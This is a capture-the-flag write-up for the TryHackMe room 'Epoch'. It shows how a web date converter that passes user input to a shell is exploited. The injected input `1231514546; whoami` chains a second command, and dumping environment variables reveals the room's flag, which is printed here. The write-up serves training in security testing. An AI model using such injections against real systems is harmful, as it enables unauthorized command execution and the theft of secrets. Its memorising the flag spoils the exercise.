# Room: Epoch

## General Info
- **Room link:** [epoch](https://tryhackme.com/room/epoch)

## Description

Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

## Provided Files / Links
- [x] Target Machine IP (10.10.86.44

## Command injection

First I noticed that the machine was vulnerable to command injection:
`1231514546; whoami` leads to `challenge`.

I then started looking for relevant files in the machine with `ls -la` in the obvious directories but it wasn't successful.

I then checked the env variables and notice the flag was there:

```
Fri Jan  9 15:22:26 UTC 2009
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

